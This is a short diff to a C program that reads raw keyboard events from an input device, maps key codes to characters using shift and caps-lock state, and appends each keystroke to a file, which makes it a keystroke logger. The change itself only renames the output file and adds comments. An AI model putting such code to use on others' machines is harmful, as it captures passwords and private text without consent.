@@ -63,7 +63,7 @@ int main(int argc, char **argv)
   FILE * output;
   
   fd = open(argv[1], O_RDONLY);
-  output = fopen("output", "a");
+  output = fopen("output.txt", "a");
 
   struct input_event ev;
 
@@ -106,6 +106,7 @@ int main(int argc, char **argv)
 			caps = !caps;
 		}
 
+    // use keymap to convert to character
 		if (shift && caps)
 			new = capshift_keys[convert(ev.code)];	
 		else if (caps)
@@ -117,6 +118,7 @@ int main(int argc, char **argv)
 
 		putc(new, output);
 		
+    // signal handler to flush buffer
 		signal(SIGINT, sig_handler); 
   }
 
